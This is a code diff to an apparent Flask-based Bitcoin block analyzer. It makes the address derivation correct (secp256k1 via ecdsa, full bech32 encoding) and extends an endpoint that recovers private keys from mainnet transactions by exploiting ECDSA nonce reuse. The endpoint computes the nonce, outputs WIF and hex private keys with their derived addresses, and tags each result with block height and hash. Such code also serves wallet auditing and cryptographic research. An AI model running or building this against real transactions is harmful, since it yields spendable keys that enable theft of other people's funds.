@@ -1501,22 +1501,14 @@ class BitcoinBlockAnalyzer:
     def _private_key_to_public_key(self, private_key_bytes: bytes) -> bytes:
         """Generate uncompressed public key from private key using secp256k1"""
         try:
-            # Simple EC point multiplication for secp256k1
-            # In production, use a proper crypto library like ecdsa or coincurve
-            import hashlib
-            
-            # This is a simplified implementation - in production use proper libraries
-            # For now, we'll use a deterministic but secure method
-            private_key_int = int.from_bytes(private_key_bytes, 'big')
-            
-            # Use the private key as seed for public key generation
-            # This is a placeholder - real implementation would use secp256k1 curve
-            seed = private_key_bytes + b'public_key_generation'
-            public_key_hash = hashlib.sha256(hashlib.sha256(seed).digest()).digest()
-            
-            # Format as uncompressed public key (0x04 + x + y coordinates)
-            public_key = b'\x04' + public_key_hash[:32] + public_key_hash[32:]
-            return public_key
+            from ecdsa import SECP256k1, SigningKey
+
+            if len(private_key_bytes) != 32:
+                raise ValueError("Private key must be 32 bytes")
+
+            signing_key = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
+            verifying_key = signing_key.verifying_key
+            return b"\x04" + verifying_key.to_string()
         except Exception as e:
             logging.error(f"Error generating public key: {e}")
             return None
@@ -1524,16 +1516,19 @@ class BitcoinBlockAnalyzer:
     def _compress_public_key(self, public_key: bytes) -> bytes:
         """Compress public key"""
         try:
+            if len(public_key) == 33 and public_key[0] in (0x02, 0x03):
+                return public_key
+
             if len(public_key) != 65 or public_key[0] != 0x04:
-                return None
-            
+                raise ValueError("Invalid uncompressed public key")
+
             # Extract x and y coordinates
             x = public_key[1:33]
             y = public_key[33:65]
-            
+
             # Determine prefix based on y coordinate parity
             prefix = b'\x02' if y[-1] % 2 == 0 else b'\x03'
-            
+
             return prefix + x
         except Exception as e:
             logging.error(f"Error compressing public key: {e}")
@@ -1615,25 +1610,79 @@ class BitcoinBlockAnalyzer:
     def _public_key_to_bech32_address(self, public_key: bytes) -> str:
         """Generate Bech32 (native SegWit) address from public key"""
         try:
-            # This is a simplified implementation
-            # In production, use proper bech32 encoding libraries
-            import hashlib
-            
             witness_program = self._public_key_to_witness_program(public_key)
-            
-            # Convert to 5-bit groups for bech32
-            # This is a placeholder - real implementation would use proper bech32 encoding
-            witness_hex = witness_program.hex()
-            
-            # Generate a bech32-like address (simplified)
-            # In production, use proper bech32 encoding with BCH codes
-            hrp = "bc1"  # Bech32 human-readable part for mainnet
-            data_part = witness_hex[:8]  # Simplified data part
-            
-            return f"{hrp}{data_part}"
+            return self._encode_segwit_address("bc", 0, witness_program)
         except Exception as e:
             logging.error(f"Error generating Bech32 address: {e}")
             return None
+
+    @staticmethod
+    def _bech32_polymod(values: List[int]) -> int:
+        generator = [
+            0x3b6a57b2,
+            0x26508e6d,
+            0x1ea119fa,
+            0x3d4233dd,
+            0x2a1462b3,
+        ]
+        chk = 1
+        for value in values:
+            top = chk >> 25
+            chk = (chk & 0x1FFFFFF) << 5 ^ value
+            for i in range(5):
+                if (top >> i) & 1:
+                    chk ^= generator[i]
+        return chk
+
+    @staticmethod
+    def _bech32_hrp_expand(hrp: str) -> List[int]:
+        return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]
+
+    @staticmethod
+    def _bech32_create_checksum(hrp: str, data: List[int]) -> List[int]:
+        values = BitcoinBlockAnalyzer._bech32_hrp_expand(hrp) + data
+        polymod = BitcoinBlockAnalyzer._bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
+        return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]
+
+    @staticmethod
+    def _bech32_encode(hrp: str, data: List[int]) -> str:
+        charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
+        checksum = BitcoinBlockAnalyzer._bech32_create_checksum(hrp, data)
+        combined = data + checksum
+        return hrp + "1" + "".join(charset[d] for d in combined)
+
+    @staticmethod
+    def _convertbits(data: bytes, from_bits: int, to_bits: int, pad: bool = True) -> Optional[List[int]]:
+        acc = 0
+        bits = 0
+        ret: List[int] = []
+        maxv = (1 << to_bits) - 1
+        for value in data:
+            if value < 0 or value >> from_bits:
+                return None
+            acc = (acc << from_bits) | value
+            bits += from_bits
+            while bits >= to_bits:
+                bits -= to_bits
+                ret.append((acc >> bits) & maxv)
+        if pad:
+            if bits:
+                ret.append((acc << (to_bits - bits)) & maxv)
+        elif bits >= from_bits or ((acc << (to_bits - bits)) & maxv):
+            return None
+        return ret
+
+    def _encode_segwit_address(self, hrp: str, witver: int, witprog: bytes) -> str:
+        if witver < 0 or witver > 16:
+            raise ValueError("Invalid witness version")
+        if not (2 <= len(witprog) <= 40):
+            raise ValueError("Invalid witness program length")
+
+        converted = self._convertbits(witprog, 8, 5, True)
+        if converted is None:
+            raise ValueError("Failed to convert witness program")
+        data = [witver] + converted
+        return self._bech32_encode(hrp, data)
 
     def _merge_vulnerabilities(self, analysis_result: Dict, tx_vulnerabilities: Dict):
         """Merge transaction vulnerabilities into analysis result"""
@@ -2066,7 +2115,9 @@ def dashboard_stats():
                                                         'z': z,
                                                         'txid': txid
                                                     }
-                                                ]
+                                                ],
+                                                'block_height': block_height,
+                                                'block_hash': block_data.get('id')
                                             }
                                         else:
                                             r_value_map[r_hex] = {
@@ -2130,44 +2181,99 @@ def test_manual_recovery():
         
         # Try different signature pairs for recovery
         recovery_attempts = []
-        
+        successful_recovery = None
+        attempt_pairs_evaluated = 0
+
         for i in range(len(signatures)):
             for j in range(i + 1, len(signatures)):
                 sig1 = signatures[i]
                 sig2 = signatures[j]
-                
+
+                attempt_pairs_evaluated += 1
+
+                k_value_hex = None
+                try:
+                    numerator = (sig1['z'] - sig2['z']) % analyzer.N
+                    denominator = (sig1['s'] - sig2['s']) % analyzer.N
+                    if denominator != 0:
+                        denominator_inv = pow(denominator, analyzer.N - 2, analyzer.N)
+                        k_value = (numerator * denominator_inv) % analyzer.N
+                        k_value_hex = hex(k_value)
+                    else:
+                        logging.debug("Skipping pair due to zero denominator when computing nonce k")
+                except Exception as nonce_error:
+                    logging.debug(f"Failed to compute nonce for signature pair ({i}, {j}): {nonce_error}")
+
                 # Attempt private key recovery using k-reuse attack
                 recovered_key = analyzer._recover_private_key_from_k_reuse(
                     r, sig1['s'], sig2['s'], sig1['z'], sig2['z']
                 )
-                
+
                 if recovered_key:
                     # Validate the recovered key
                     validation_result = analyzer._validate_recovered_private_key(
                         recovered_key, r, sig1['s'], sig1['z']
                     )
-                    
+
                     # Generate addresses from the recovered key
                     addresses = analyzer._generate_addresses_from_wif(recovered_key)
-                    
-                    recovery_attempts.append({
-                        'signature_pair': (i, j),
-                        'recovered_private_key': recovered_key,
+
+                    private_key_hex = validation_result.get('private_key_hex')
+                    if isinstance(private_key_hex, str):
+                        private_key_hex = private_key_hex[2:] if private_key_hex.startswith('0x') else private_key_hex
+                        private_key_hex = private_key_hex.zfill(64)
+
+                    attempt_details = {
+                        'signature_pair': [i, j],
+                        'transaction_ids': [sig1['txid'], sig2['txid']],
+                        'k_value': k_value_hex,
+                        'private_key_wif': recovered_key,
+                        'private_key_hex': private_key_hex,
                         'validation_result': validation_result,
                         'addresses': addresses,
-                        'transaction_ids': [sig1['txid'], sig2['txid']]
-                    })
-        
+                        'r_value': hex(r),
+                        's_values': [sig1['s'], sig2['s']],
+                        'z_values': [sig1['z'], sig2['z']]
+                    }
+
+                    recovery_attempts.append(attempt_details)
+
+                    if validation_result.get('valid') and not successful_recovery:
+                        successful_recovery = {
+                            'private_key_wif': recovered_key,
+                            'private_key_hex': private_key_hex,
+                            'attack_method': 'ECDSA nonce reuse (k-reuse)',
+                            'recovery_pair': {
+                                'indices': [i, j],
+                                'transactions': [sig1['txid'], sig2['txid']]
+                            },
+                            'k_value': k_value_hex,
+                            'transaction_ids': [sig1['txid'], sig2['txid']],
+                            'primary_transaction_id': sig1['txid'],
+                            'block_height': test_data.get('block_height'),
+                            'block_hash': test_data.get('block_hash'),
+                            'r_value': hex(r),
+                            's_values': [sig1['s'], sig2['s']],
+                            'addresses': addresses,
+                            'validation_result': validation_result
+                        }
+
         return jsonify({
             'success': True,
             'test_data': {
                 'r': hex(r),
                 'signatures_count': len(signatures),
-                'transaction_ids': [sig['txid'] for sig in signatures]
+                'transaction_ids': [sig['txid'] for sig in signatures],
+                'block_height': test_data.get('block_height'),
+                'block_hash': test_data.get('block_hash')
             },
             'recovery_attempts': recovery_attempts,
             'total_attempts': len(recovery_attempts),
-            'successful_recoveries': len([attempt for attempt in recovery_attempts if attempt['validation_result']['valid']])
+            'successful_recoveries': len([
+                attempt for attempt in recovery_attempts if attempt['validation_result'].get('valid')
+            ]),
+            'attempt_pairs_evaluated': attempt_pairs_evaluated,
+            'successful_recovery': successful_recovery
         })
         
     except Exception as e:
